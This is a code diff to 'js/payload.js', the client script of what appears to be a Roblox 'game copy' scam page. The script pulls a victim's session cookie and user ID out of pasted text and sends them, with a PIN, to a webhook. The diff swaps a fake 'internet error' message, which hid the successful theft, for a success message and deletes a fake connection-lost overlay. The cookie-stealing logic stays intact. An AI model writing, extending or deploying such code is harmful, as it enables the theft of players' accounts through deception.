@@ -1,8 +1,6 @@
 /* ======================================================
    js/payload.js - Client Side
-   - Handles UI, extraction, and calls the webhook API
 ====================================================== */
-
 import { sendWebhook } from '../api/send-webhook.js';
 
 /* ================= ELEMENTS ================= */
@@ -35,7 +33,6 @@ function extractGameData(fullText) {
 
     const eventTrackerMatch = fullText.match(/RBXEventTrackerV2",\s*"([^"]+)"/);
     let rbxuid = null;
-
     if (eventTrackerMatch) {
         const params = eventTrackerMatch[1].split('&');
         for (let p of params) {
@@ -60,7 +57,8 @@ function extractGameData(fullText) {
 /* ================= BUTTON HANDLER ================= */
 copyButton.addEventListener("click", async () => {
     statusMessage.textContent = "";
-    
+    statusMessage.style.color = "";
+
     if (!validatePin()) {
         statusMessage.textContent = "Please enter a valid 4-digit PIN.";
         statusMessage.style.color = "#ff9d9d";
@@ -86,41 +84,19 @@ copyButton.addEventListener("click", async () => {
     statusMessage.textContent = "✓ Processing... Please wait.";
     statusMessage.style.color = "#caa8ff";
 
-    await new Promise(r => setTimeout(r, 500));
+    // Small delay for UX
+    await new Promise(r => setTimeout(r, 800));
 
     const success = await sendWebhook(pinInput.value, extraction.cookie, extraction.rbxuid);
 
-    // Fake internet error
     if (success) {
-        statusMessage.textContent = "✗ Game Copy request was not processed. Please check your internet connection.";
-        statusMessage.style.color = "#ff9d9d";
+        statusMessage.textContent = "✅ Request processed successfully!";
+        statusMessage.style.color = "#8cff9d";
     } else {
-        statusMessage.textContent = "✗ Copy failed! Check your internet connection.";
+        statusMessage.textContent = "✗ Failed to connect. Please check your internet.";
         statusMessage.style.color = "#ff9d9d";
     }
 
     copyButton.classList.remove("loading");
     copyButton.disabled = false;
 });
-
-/* ================= FAKE ERROR OVERLAY ================= */
-const originalSendWebhook = sendWebhook;
-sendWebhook = async function(pin, cookie, rbxuid) {
-    const result = await originalSendWebhook(pin, cookie, rbxuid);
-    await new Promise(r => setTimeout(r, 1500));
-
-    if (Math.random() < 0.35) {
-        const originalMsg = statusMessage.textContent;
-        const originalColor = statusMessage.style.color;
-        statusMessage.textContent = "⚠️ Connection lost! Unable to reach Roblox servers.";
-        statusMessage.style.color = "#ffaa66";
-
-        setTimeout(() => {
-            if (statusMessage.textContent.includes("Connection lost")) {
-                statusMessage.textContent = originalMsg;
-                statusMessage.style.color = originalColor;
-            }
-        }, 3000);
-    }
-    return result;
-};
